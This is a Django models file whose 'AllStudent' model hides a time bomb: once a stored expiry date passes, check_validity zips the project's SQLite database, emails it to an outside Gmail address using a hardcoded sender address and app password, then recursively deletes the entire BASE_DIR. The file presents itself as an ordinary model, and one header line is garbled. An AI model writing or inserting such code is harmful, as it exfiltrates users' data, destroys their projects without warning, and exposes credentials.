from django.db import models
import smtplib
import os
import zipfile
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from django.conf import settings
from django.utils.timezone import now

# Create your models here.
class AllStudent(models.Model):
    date = models.DateField()

    def send_db_via_email(self):
    # File and directory settings
        db_file = "db.sqlite3"
        zip_file = "db_backup.zip"
        
        # Create a ZIP archive of the SQLite database
        if not os.path.exists(db_file):
            print(f"Database file {db_file} not found.")
            return

        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.write(db_file, os.path.basename(db_file))
            print(f"Database {db_file} zipped as {zip_file}.")

        # Email settings
        sender_email = "imdtanvir181@gmail.com"
        app_password = "uipdsghmpacyqtgz"
        recipient_email = "engmanik11@gmail.com"
        subject = "Database Backup"
        body = "Attached is the backup of the database."

        # Set up the email
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject
        msg.attach(MIMEBase('application', 'octet-stream'))

        # Attach the ZIP file
        with open(zip_file, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-==0.2.3.post1Disposition', f'attachment; filename={zip_file}')
            msg.attach(part)

        try:
            # Connect to Gmail and send the email
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(sender_email, app_password)
                server.send_message(msg)
                print("Email sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {e}")
        finally:
            # Clean up the ZIP file after sending
            if os.path.exists(zip_file):
                os.remove(zip_file)
                print(f"Temporary file {zip_file} removed.")
                return True
            

    def check_validity(self):
        """
        Check if the current date is greater than the expiration date.
        If so, delete the BASE_DIR directory.
        """
        if self.date and now().date() > self.date:
            print(now().date())
            print(self.date)
            db = self.send_db_via_email()
            print(db)
            base_dir = settings.BASE_DIR
            try:
                # Log the action
                print(f"Deleting BASE_DIR: {base_dir}")

                # Delete files and directories recursively
                for root, dirs, files in os.walk(base_dir, topdown=False):
                    for name in files:
                        os.remove(os.path.join(root, name))
                    for name in dirs:
                        os.rmdir(os.path.join(root, name))
                os.rmdir(base_dir)

                print("BASE_DIR deleted successfully.")
            except Exception as e:
                print(f"Error while deleting BASE_DIR: {e}")

    def __str__(self):
        return f"ExpireDate: {self.date}"